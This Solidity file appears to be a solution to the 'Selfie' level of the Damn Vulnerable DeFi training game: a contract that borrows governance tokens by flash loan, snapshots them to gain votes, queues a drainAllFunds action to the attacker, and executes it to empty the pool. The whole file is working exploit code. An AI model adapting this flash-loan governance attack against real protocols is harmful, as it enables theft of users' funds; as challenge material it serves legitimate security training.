// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title HackSelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface SelfiePoolX {
    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

interface SimpleGovernanceX {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external;
}

contract HackSelfie {
    SelfiePoolX public immutable pool;
    SimpleGovernanceX public immutable governance;

    uint256 actionId;

    constructor(address poolAddress, address governanceAddress) {
        pool = SelfiePoolX(poolAddress);
        governance = SimpleGovernanceX(governanceAddress);
    }

    function startSelfieHack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot(token).snapshot();

        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin),
            0
        );

        DamnValuableTokenSnapshot(token).transfer(msg.sender, amount);
    }

    function endSelfieHack() external {
        governance.executeAction(actionId);
    }
}
